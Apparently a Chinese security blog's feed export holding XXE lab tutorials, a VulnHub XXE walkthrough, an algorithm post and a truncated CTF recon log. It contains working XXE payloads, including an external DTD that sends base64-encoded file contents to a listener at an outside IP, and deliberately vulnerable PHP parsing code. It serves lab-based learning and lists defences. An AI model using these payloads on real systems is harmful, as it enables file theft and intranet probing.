class="number">20</span>pOwoKCSR<span class="number">1</span><span class="keyword">c</span><span class="number">2</span>VybmFtZSA<span class="number">9</span>ICRjcmVkcy<span class="number">0</span>+dXNlcm<span class="number">5</span>hbWU<span class="number">7</span>CgkkcGFzc<span class="number">3</span>dvcmQgPSAkY<span class="number">3</span>JlZHMtPnBhc<span class="number">3</span>N<span class="number">3</span>b<span class="number">3</span>JkOwoKCWlmKCR<span class="number">1</span><span class="keyword">c</span><span class="number">2</span>VybmFtZSA<span class="number">9</span>PSAkVVNFUk<span class="number">5</span>BTUUgJiYgJHBhc<span class="number">3</span>N<span class="number">3</span>b<span class="number">3</span>JkID<span class="number">09</span>ICRQQVNTV<span class="number">09</span>SRCl<span class="number">7</span>CgkJJHJlc<span class="number">3</span>VsdDEgPSBzcHJpbnRmKCI<span class="number">8</span>cmVzdWx<span class="number">0</span>Pjxjb<span class="number">2</span>RlPiVkPC<span class="number">9</span>jb<span class="number">2</span>RlPjxtc<span class="number">2</span><span class="keyword">c</span>+JXM<span class="number">8</span>L<span class="number">21</span>zZz<span class="number">48</span>L<span class="number">3</span>Jlc<span class="number">3</span>VsdD<span class="number">4</span>iLDEsJHVzZXJuYW<span class="number">1</span>lKTsKCQkkcmVzdWx<span class="number">0</span>ID<span class="number">0</span><span class="keyword">gc</span><span class="number">3</span>ByaW<span class="number">50</span>ZigiPHJlc<span class="number">3</span>VsdD<span class="number">48</span>Y<span class="number">29</span>kZT<span class="number">4</span>lZDwvY<span class="number">29</span>kZT<span class="number">48</span>L<span class="number">3</span>Jlc<span class="number">3</span>VsdD<span class="number">4</span>iLDEpOwoJfWVsc<span class="number">2</span>V<span class="number">7</span>CgkJJHJlc<span class="number">3</span>VsdDEgPSBzcHJpbnRmKCI<span class="number">8</span>cmVzdWx<span class="number">0</span>Pjxjb<span class="number">2</span>RlPiVkPC<span class="number">9</span>jb<span class="number">2</span>RlPjxtc<span class="number">2</span><span class="keyword">c</span>+JXM<span class="number">8</span>L<span class="number">21</span>zZz<span class="number">48</span>L<span class="number">3</span>Jlc<span class="number">3</span>VsdD<span class="number">4</span>iLDAsJHVzZXJuYW<span class="number">1</span>lKTsKCQkkcmVzdWx<span class="number">0</span>ID<span class="number">0</span><span class="keyword">gc</span><span class="number">3</span>ByaW<span class="number">50</span>ZigiPHJlc<span class="number">3</span>VsdD<span class="number">48</span>Y<span class="number">29</span>kZT<span class="number">4</span>lZDwvY<span class="number">29</span>kZT<span class="number">48</span>L<span class="number">3</span>Jlc<span class="number">3</span>VsdD<span class="number">4</span>iLDApOwoJfQkKfWNhdGNoKEV<span class="number">4</span>Y<span class="number">2</span>VwdGlvbiAkZSl<span class="number">7</span>CgkkcmVzdWx<span class="number">0</span>MSA<span class="number">9</span>IHNwcmludGYoIjxyZXN<span class="number">1</span>bHQ+PGNvZGU+JWQ<span class="number">8</span>L<span class="number">2</span>NvZGU+PG<span class="number">1</span>zZz<span class="number">4</span>lczwvbXNnPjwvcmVzdWx<span class="number">0</span>PiIsMywkZS<span class="number">0</span>+Z<span class="number">2</span>V<span class="number">0</span>TWVzc<span class="number">2</span>FnZSgpKTsKCSRyZXN<span class="number">1</span>bHQgPSBzcHJpbnRmKCI<span class="number">8</span>cmVzdWx<span class="number">0</span>Pjxjb<span class="number">2</span>RlPiVkPC<span class="number">9</span>jb<span class="number">2</span>RlPjwvcmVzdWx<span class="number">0</span>PiIsMyk<span class="number">7</span>Cn<span class="number">0</span>KCmhlYWRlcignQ<span class="number">29</span>udGVudC<span class="number">1</span>UeXBlOiB<span class="number">0</span>ZXh<span class="number">0</span>L<span class="number">2</span>h<span class="number">0</span>bWw<span class="number">7</span>IGNoYXJzZXQ<span class="number">9</span>dXRmLTgnKTsKZWNobyAkcmVzdWx<span class="number">0</span>Owo/Pg==</span><br></pre></td></tr></table></figure>

<p>注意去掉最前面的斜杠。</p>
<p>base64解码得到源码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php">$USERNAME = <span class="string">'heetianlab'</span>; <span class="comment">//è´¦å·</span></span></span><br><span class="line"><span class="php">$PASSWORD = <span class="string">'test009'</span>; <span class="comment">//å¯ç </span></span></span><br><span class="line"><span class="php">$result = <span class="keyword">null</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">libxml_disable_entity_loader(<span class="keyword">false</span>);</span></span><br><span class="line"><span class="php">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="php">	$dom = <span class="keyword">new</span> DOMDocument();</span></span><br><span class="line"><span class="php">	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span></span><br><span class="line"><span class="php">	$creds = simplexml_import_dom($dom);</span></span><br><span class="line"></span><br><span class="line"><span class="php">	$username = $creds-&gt;username;</span></span><br><span class="line"><span class="php">	$password = $creds-&gt;password;</span></span><br><span class="line"></span><br><span class="line"><span class="php">	<span class="keyword">if</span>($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;</span></span><br><span class="line"><span class="php">		$result1 = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="number">1</span>,$username);</span></span><br><span class="line"><span class="php">		$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;/result&gt;"</span>,<span class="number">1</span>);</span></span><br><span class="line"><span class="php">	&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">		$result1 = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="number">0</span>,$username);</span></span><br><span class="line"><span class="php">		$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;/result&gt;"</span>,<span class="number">0</span>);</span></span><br><span class="line"><span class="php">	&#125;	</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)&#123;</span></span><br><span class="line"><span class="php">	$result1 = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="number">3</span>,$e-&gt;getMessage());</span></span><br><span class="line"><span class="php">	$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;/result&gt;"</span>,<span class="number">3</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">header(<span class="string">'Content-Type: text/html; charset=utf-8'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $result;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>



<p><font color="red">注意下面这种方式容易带不出数据</font>：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://104.243.21.153/xxe/evil2.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;send<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1><span id="xml外部实体注入漏洞">XML外部实体注入漏洞</span></h1><h2><span id="实验一-dtd学习">实验一 DTD学习</span></h2><p>（1）内部实体声明：</p>
<p>内部实体声明语法：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="meta-string">"实体的值"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>getxml.php源码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	$xml = simplexml_load_string($_GET[<span class="string">'XML'</span>],<span class="string">'simplexmlElement'</span>,LIBXML_NOENT);</span></span><br><span class="line"><span class="php">	<span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span></span><br><span class="line"><span class="php">	print_r($xml);</span></span><br><span class="line"><span class="php">	<span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>使用浏览器访问：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">localhost/xml/getxml.php?xml=<span class="meta">&lt;!DOCTYPE <span class="meta-keyword">books</span>[<span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-string">"Hello World"</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">books</span>&gt;</span>%26test;<span class="tag">&lt;/<span class="name">books</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意&amp;要url编码为%26不然会被识别为参数分隔符&amp;符号。</p>
<p><img src="/assets/image-20200512173031186.png" alt="image-20200512173031186"></p>
<p>（2）外部实体声明语法</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY </span></span><br><span class="line"><span class="meta">实体名称 <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"URI/URL"</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br></pre></td></tr></table></figure>



<p>同样使用浏览器访问：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">localhost/xml/getxml.php?xml=<span class="meta">&lt;!DOCTYPE <span class="meta-keyword">books</span>[<span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://localhost/xmltest.txt"</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">books</span>&gt;</span>%26test;<span class="tag">&lt;/<span class="name">books</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200512173328274.png" alt="image-20200512173328274"></p>
<p>注意，从实体的引用分为三类：</p>
<ul>
<li>一般实体 直接使用&amp;实体名; 进行引用</li>
<li>预定义实体 就是有些特殊符号需要实体化。</li>
<li>参数实体 用 % 实体名称 定义。</li>
</ul>
<p>（3）参数实体</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">内部：<span class="meta">&lt;!ENTITY % 实体名称 <span class="meta-string">"实体值"</span>&gt;</span></span><br><span class="line">外部：<span class="meta">&lt;!ENTITY % 实体名称 <span class="meta-keyword">SYSTEM</span>  <span class="meta-string">"URI"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>用浏览器访问</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">localhost/xml/getxml.php?xml=<span class="meta">&lt;!DOCTYPE <span class="meta-keyword">books</span>[<span class="meta">&lt;!ENTITY %25 <span class="meta-keyword">test</span> <span class="meta-string">"&lt;!ENTITY hello ‘hello world’&gt;"</span>&gt;</span>%25test;]&gt;</span><span class="tag">&lt;<span class="name">books</span>&gt;</span>%26hello;<span class="tag">&lt;/<span class="name">books</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200512174400262.png" alt="image-20200512174400262"></p>
<h2><span id="实验二-有回显的本地文件读取">实验二  有回显的本地文件读取</span></h2><p>漏洞代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	libxml_disable_entity_loader(<span class="keyword">false</span>);</span></span><br><span class="line"><span class="php">	$xmlfile = file_get_contents(‘php:<span class="comment">//input’);</span></span></span><br><span class="line"><span class="php">	$dom = <span class="keyword">new</span> DOMDocument();</span></span><br><span class="line"><span class="php">	$dom-&gt;loadXML($xmlfile,LIBXML_NOENT|LIBXML_DTDLOAD);</span></span><br><span class="line"><span class="php">	$creds = simplexml_import_dom($dom); </span></span><br><span class="line"><span class="php">	<span class="keyword">echo</span> $creds;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>



<p>正常get请求：</p>
<p><img src="/assets/image-20200512175248013.png" alt="image-20200512175248013"></p>
<p>添加body：</p>
<p><img src="/assets/image-20200512175419134.png" alt="image-20200512175419134"></p>
<p>读文件：</p>
<p><img src="/assets/image-20200512181711946.png" alt="image-20200512181711946"></p>
<p>读带有特殊符号文件：</p>
<p><img src="/assets/image-20200512181804569.png" alt="image-20200512181804569"></p>
<p>发现报错，所以要使用CDATA</p>
<p>CDATA:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&lt;![CDATA[内容]]&gt;</span><br></pre></td></tr></table></figure>

<p>而且要引用外部实体</p>
<p><img src="/assets/image-20200512183847087.png" alt="image-20200512183847087"></p>
<p>其中evil.dtd:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">evil</span> <span class="meta-string">"%start;%xxe;%end;"</span></span></span><br></pre></td></tr></table></figure>

<p>注意这里逻辑是：</p>
<p>（1）执行DTD中%data</p>
<p>（2）%data执行获取远程dtd</p>
<p>（3）执行&evil;</p>
<p>（4）&amp;evil执行中执行%start;%xxe;%end;</p>
<p>（5）执行CDATA获取远程文件。</p>
<h2><span id="实验三-无回显的本地文件读取">实验三 无回显的本地文件读取。</span></h2><p>源码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	libxml_disable_entity_loader(<span class="keyword">false</span>);</span></span><br><span class="line"><span class="php">	$xmlfile = file_get_contents(‘php:<span class="comment">//input’);</span></span></span><br><span class="line"><span class="php">	$dom = <span class="keyword">new</span> DOMDocument();</span></span><br><span class="line"><span class="php">	$dom-&gt;loadXML($xmlfile,LIBXML_NOENT|LIBXML_DTDLOAD);</span></span><br><span class="line"><span class="php">	$creds = simplexml_import_dom($dom); </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>不同的就是没有echo响应数据。</p>
<p>首先本地端口监听数据：</p>
<p><img src="/assets/image-20200512185519178.png" alt="image-20200512185519178"></p>
<p>请求包payload:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://localhost/xml/evil2.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span>&amp;send<span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>evil2.dtd:</p>
<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read-convert.base64-encode/resource=http://localhost/xmltest2.txt"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-string">"&lt;!ENTITY send SYSTEM 'http://10.1.1.123:8888/?%xxe;'&gt;"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%dtd;</span></span><br></pre></td></tr></table></figure>



<p><img src="/assets/image-20200512191755026.png" alt="image-20200512191755026"></p>
<p>base64解码后得到内容：</p>
<p><img src="/assets/image-20200512191821789.png" alt="image-20200512191821789"></p>
<h2><span id="实验四-利用xxe进行内网主机探测">实验四 利用XXE进行内网主机探测。</span></h2><p>利用先前有回显的XXE进行内网主机探测,探测原理是访问内网每个ip地址的80端口，观看response。</p>
<p>如图所示，访问主机：</p>
<p><img src="/assets/image-20200513095511671.png" alt="image-20200513095511671"></p>
<p>所以直接用burp扫描即可。</p>
<p><img src="/assets/image-20200513095810003.png" alt="image-20200513095810003"></p>
<p>当响应有如下时即代表主机不存活。</p>
<p><img src="/assets/image-20200513101256793.png" alt="image-20200513101256793"></p>
<p>其他代表存活，一共有3台机器存活，</p>
<p><img src="/assets/image-20200513101344183.png" alt="image-20200513101344183"></p>
<p><img src="/assets/image-20200513101431798.png" alt="image-20200513101431798"></p>
<p>防御方法：</p>
<p>（1）过滤用户输入的html数据，以及一些关键词。</p>
<p>（2）禁用外部实体：</p>
<ul>
<li><p>libxml_disable_entity_loader(true)<em>;</em> </p>
</li>
<li><p>DocumentBuilderFactorydbf =DocumentBuilderFactory.<strong>new**</strong>Instance**();</p>
<p>dbf.setExpandEntityReferences(false);</p>
</li>
</ul>
<p>参考：</p>
<p> <a href="http://www.hetianlab.com/expc.do?ce=e84d7a28-357a-4a01-996c-31d2dd21a810" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=e84d7a28-357a-4a01-996c-31d2dd21a810</a></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>求数组连续最大和</title>
    <url>/%E7%AE%97%E6%B3%95/%E6%B1%82%E6%95%B0%E7%BB%84%E8%BF%9E%E7%BB%AD%E6%9C%80%E5%A4%A7%E5%92%8C/</url>
    <content><![CDATA[<p>题目描述：</p>
<p>一个有n个元素的数组，这个元素的数组既可以是正数又可以是负数，数组中连续的一个元素或多个元素可以组成一个连续的子数组，一个数组可能有很多个子数组，求子数组和的最大值。</p>
<h2><span id="方法一">方法一：</span></h2><p>设$$sum[i][j]$$为从i到j的数组和（其中i&lt;j），则计算出所有的sum即可。</p>
<p>sum计算公式：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">sum[<span class="string">i</span>][<span class="symbol">j</span>] = sum[<span class="string">i</span>][<span class="symbol">j-1</span>] + a[j]           （1-1）</span><br></pre></td></tr></table></figure>



<p>计算顺序，如图所示，画出一个二维数组表，其中值对应的就是$$sum[i][j]$$。</p>
<p>（1）先计算对角线上元素值。</p>
<p>（2）从第一行开始从左往右计算出值，并且每次计算的值和最大的值比较。计算方法为上面的公式（1-1）</p>
<p>（3）从2-n行开始从左往右计算出值，并且每次计算的值和最大的值比较。</p>
<p><img src="/assets/image-20200512234712911.png" alt="image-20200512234712911"></p>
<p>方法二：</p>
<p>动态规划方法：</p>
<p>dp[i]为以nums[i]结尾的最大子序列和。则：</p>
<p>（1）如果nums[i]&gt;dp[i-1]而且dp[i-1]&lt;0，那么</p>
<p>dp[i]=nums[i]</p>
<p>（2）如果dp[i-1]&gt;0，dp[i]=dp[i-1]+nums[i]</p>
<p>所以：</p>
<p><img src="/assets/image-20200603213124571.png" alt="image-20200603213124571"></p>
<p><img src="/assets/image-20200603213749125.png" alt="image-20200603213749125"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> len = nums.length;</span><br><span class="line">        <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[len];</span><br><span class="line">        dp[<span class="number">0</span>]=nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> maxValue = dp[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>;i &lt; len;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(dp[i-<span class="number">1</span>]&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                dp[i] = nums[i];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                dp[i] = nums[i]+dp[i-<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(dp[i] &gt; maxValue)&#123;</span><br><span class="line">                maxValue = dp[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxValue;</span><br></pre></td></tr></table></figure>



<p>感觉可以减少空间复杂度，dp没必要，用一个变量就可以了。</p>
<p>改进后：</p>
<p><img src="/assets/image-20200603214835166.png" alt="image-20200603214835166"></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub_xxe</title>
    <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/vulnhub-xxe/</url>
    <content><![CDATA[<h1><span id="vulnhub-xxe实验">vulnhub xxe实验</span></h1><h2><span id="1主机发现">(1)主机发现</span></h2><p>首先ifconfig查看当前ip地址： 10.1.1.92</p>
<p>然后利用netdiscover被动扫描扫描局域网机器。</p>
<a id="more"></a>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover -r 10.1.1.92/24</span><br></pre></td></tr></table></figure>



<p><img src="/assets/image-20200512161540297.png" alt="image-20200512161540297"></p>
<p>发现两台机器，90，91，93</p>
<p>利用Nmap扫描端口：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim ip.txt #将要扫描的ip列表写进ip.txt</span><br><span class="line">nmap -sV -p 1-65535 -iL ip.txt -v</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="/assets/image-20200512163413524.png" alt="image-20200512163413524"></p>
<p><img src="/assets/image-20200512163430298.png" alt="image-20200512163430298"></p>
<p><img src="/assets/image-20200512163449465.png" alt="image-20200512163449465"></p>
<p>访问91机器，发现是apache目录，找到目标。</p>
<h2><span id="2网站扫描">（2）网站扫描</span></h2><p>利用kali的dirb扫描:</p>
<p><img src="/assets/image-20200512162428309.png" alt="image-20200512162428309"></p>
<p>关键文件：robots.txt</p>
<p>访问发现：</p>
<p><img src="/assets/image-20200512162501481.png" alt="image-20200512162501481"></p>
<p>可以访问xxe目录，发现有登录栏。</p>
<p>访问admin.php，发现400了。所以猜想可能是xxe下的admin.php</p>
<p>又发现一个登录页面。所以可以知道后面个登录是管理员登录，前面个登录是用户登录。</p>
<h3><span id="漏洞挖掘">漏洞挖掘</span></h3><p>访问10.1.1.91/xxe</p>
<p>输入Name和Password:</p>
<p><img src="/assets/image-20200512163534468.png" alt="image-20200512163534468"></p>
<p>抓包:</p>
<p><img src="/assets/image-20200512163659235.png" alt="image-20200512163659235"></p>
<p>发现请求是xml请求，猜想有xxe,验证一下。</p>
<p>构造payload,验证漏洞</p>
<p><img src="/assets/image-20200512164212079.png" alt="image-20200512164212079"></p>
<p>漏洞存在。</p>
<p>构造payload读取源码:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span>[<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=xxe.php"</span>&gt;</span>] &gt;</span></span><br><span class="line"><span class="symbol">&amp;xxe;</span></span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200512164305534.png" alt="image-20200512164305534"></p>
<p>然后再解码：</p>
<p><img src="/assets/image-20200512164400006.png" alt="image-20200512164400006"></p>
<p>成功读取，再读admin.php，并解码：</p>
<p><img src="/assets/image-20200512164625029.png" alt="image-20200512164625029"></p>
<p>查出账户名为administhebest。密码的md5为 e6e061838856bf47e1de730719fb2609，md5解密后为admin@123.</p>
<p>admin.php处输入账号密码：</p>
<p><img src="/assets/image-20200512164816064.png" alt="image-20200512164816064"></p>
<p>得到flag:</p>
<p><img src="/assets/image-20200512164834411.png" alt="image-20200512164834411"></p>
<p>点击后发现跳转空了，加一个xxe目录就可以。</p>
<p><img src="/assets/image-20200512164917137.png" alt="image-20200512164917137"></p>
<p>可能flag在源码里，那就读源码：</p>
<p><img src="/assets/image-20200512165013929.png" alt="image-20200512165013929"></p>
<p><img src="/assets/image-20200512165033499.png" alt="image-20200512165033499"></p>
<p>得到flag：JQZFMMCZPE4HKWTNPBUFU6JVO5QUQQJ5。</p>
<p>flag还可以再解码： L2V0Yy8uZmxhZy5waHA= </p>
<p>再base64解码：</p>
<p>/etc/.flag.php</p>
<p>再读，由于是在etc目录下，所以用file协议读：</p>
<p><img src="/assets/image-20200512165748626.png" alt="image-20200512165748626"></p>
<p>很明显有加密，本地解密得到:</p>
<p><img src="/assets/image-20200512170140547.png" alt="image-20200512170140547"></p>
<p>发现不成功，原来是最后的?&gt;标识符打错了。</p>
<p>重写后发现访问虽然成功了，但是没有结果。重新换一台windows电脑解密即可，flag:</p>
<p>SAFCSP{xxe_is_so_easy}</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>web</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>SkyConCTF2016靶机测试</title>
    <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/SkyConCTF2016%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p>1、IP探测</p>
<p>netdiscover -i eth0</p>
<p>弹出mac地址08:00:27:d3:70:74对应的ip地址为192.168.43.248</p>
<a id="more"></a>

<p>2、扫描端口</p>
<p>(1)nmap -sV -O 192.168.43.248</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> skydogconctf2016 (192.168.43.248)</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line"><span class="keyword">Not</span> shown: 997 filtered ports</span><br><span class="line">PORT    STATE <span class="built_in"> SERVICE </span> VERSION</span><br><span class="line">22/tcp  closed ssh</span><br><span class="line">80/tcp  open   http     Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">443/tcp open   ssl/http Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">MAC Address: 08:00:27:D3:70:74 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.10 - 4.8</span><br><span class="line">Network Distance: 1 hop</span><br></pre></td></tr></table></figure>

<p>只开了两个端口，80，443.Ubuntu系统</p>
<p>(2)扫描常见漏洞</p>
<p>nmap –script=vuln 192.168.43.248</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">Starting Nmap <span class="number">7.50</span> ( https://nmap.org ) at <span class="number">2018</span><span class="number">-06</span><span class="number">-02</span> <span class="number">10</span>:<span class="number">06</span> CSTPre-scan script results:</span><br><span class="line">| broadcast-avahi-dos:</span><br><span class="line">|   Discovered hosts:</span><br><span class="line">|     <span class="number">224.0</span>.<span class="number">0.251</span></span><br><span class="line">|   After NULL UDP avahi packet DoS (CVE<span class="number">-2011</span><span class="number">-1002</span>).</span><br><span class="line">|_  Hosts are all up (not vulnerable).</span><br><span class="line">Nmap scan report for skydogconctf<span class="number">2016</span> (<span class="number">192.168</span>.<span class="number">43.248</span>)</span><br><span class="line">Host is up (<span class="number">0.00096</span>s latency).</span><br><span class="line">Not shown: <span class="number">997</span> filtered ports</span><br><span class="line">PORT    STATE  SERVICE</span><br><span class="line"><span class="number">22</span>/tcp  closed ssh</span><br><span class="line"><span class="number">80</span>/tcp  open   http</span><br><span class="line">|_http-csrf: Couldn't find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn't find any DOM based XSS.</span><br><span class="line">| http-slowloris-check:</span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE<span class="number">-2007</span><span class="number">-6750</span></span><br><span class="line">|       Slowloris tries <span class="keyword">to</span> keep many connections <span class="keyword">to</span> the <span class="keyword">target</span> web server open <span class="keyword">and</span> hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections <span class="keyword">to</span></span><br><span class="line">|       the <span class="keyword">target</span> web server <span class="keyword">and</span> sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server's resources causing Denial Of Service.</span><br><span class="line">|</span><br><span class="line">|     Disclosure date: <span class="number">2009</span><span class="number">-09</span><span class="number">-17</span></span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE<span class="number">-2007</span><span class="number">-6750</span></span><br><span class="line">| http-sql-injection:</span><br><span class="line">|   Possible sqli for queries:</span><br><span class="line">|_    http://skydogconctf<span class="number">2016</span>/assets/js/<span class="keyword">c</span>,l.<span class="keyword">type</span>=a),l.width=l.height=<span class="symbol">%220</span><span class="symbol">%22</span>,l.onerror=l.onload=l.onreadystatechange=function()<span class="symbol">%7</span>bk.<span class="keyword">call</span>(this,r)<span class="symbol">%7</span>d,p.splice(e,<span class="number">0</span>,u),<span class="symbol">%22</span>img<span class="symbol">%22</span>!=a&amp;&amp;(r<span class="symbol">%7</span><span class="keyword">c</span><span class="symbol">%7</span><span class="keyword">c</span><span class="number">2</span>===y<span class="symbol">%5</span>bc<span class="symbol">%5</span>d?<span class="symbol">%28</span>t<span class="symbol">%2</span>einsertBefore<span class="symbol">%28</span>l<span class="symbol">%2</span>cs<span class="symbol">%3</span>fnull<span class="symbol">%3</span>an<span class="symbol">%29</span><span class="symbol">%2</span>cm<span class="symbol">%28</span>k<span class="symbol">%2</span>cj<span class="symbol">%29</span><span 